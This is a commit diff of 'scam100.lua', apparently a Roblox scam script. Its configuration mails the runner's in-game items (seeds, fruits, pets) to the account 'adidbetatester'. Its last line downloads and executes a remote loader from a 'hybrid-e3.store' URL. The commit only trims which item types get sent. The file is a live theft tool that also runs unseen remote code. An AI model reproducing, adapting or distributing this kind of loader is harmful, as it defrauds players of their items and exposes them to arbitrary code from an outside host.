1a3286e6b5baaac24c9fc52f5a029a420616ddc7
ChalarmZ <keemzanznr4747@gmail.com>
2026-06-16 16:37:57 +0700

    Update scam100.lua

--- scam100.lua
+++ scam100.lua
@@ -1,10 +1,7 @@
 getgenv().HB_MailConfig = {
-        MainUsername = "adidbetatester",  -- 
-        SendSeeds    = true,
-        SendAllSeeds = true,   -- true = ()
+        MainUsername = "adidbetatester",
+        SendAllSeeds = true,
         SendFruits   = true,   
-        SendPets     = true,  
-        SendPacks    = true,   
-        SendGears    = true,   
+        SendPets     = true,   
     }
 loadstring(game:HttpGet("https://hybrid-e3.store/api/scripts/4a9b943789624a36a3eae49c53f11d60/loader"))()
